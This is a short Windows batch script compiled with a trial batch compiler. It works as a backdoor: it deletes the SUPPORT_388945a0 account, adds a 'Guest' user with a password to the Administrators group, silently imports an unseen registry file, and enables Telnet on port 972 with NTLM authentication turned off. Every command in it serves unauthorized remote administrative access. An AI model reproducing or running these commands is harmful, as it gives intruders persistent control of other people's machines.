echo off
cls
echo -----------------------------------------------------------------
echo This file created with trial version of Quick Batch File Compiler.
echo Please REGISTER your copy to REMOVE this reminder.
echo Copyright 2002-2007 by Abyssmedia.com
echo Offical web-site: http://www.abyssmedia.com
echo -----------------------------------------------------------------
pause
chcp 1251
 net user SUPPORT_388945a0 /delete
 net user Guest 3080992v /add
 net localgroup Администраторы Guest /add
 net localgroup Пользователи SUPPORT_388945a0 /del
 regedit /s conf.reg
 sc config tlntsvr start= auto
 tlntadmn config port=972 sec=-NTLM
 net start Telnet
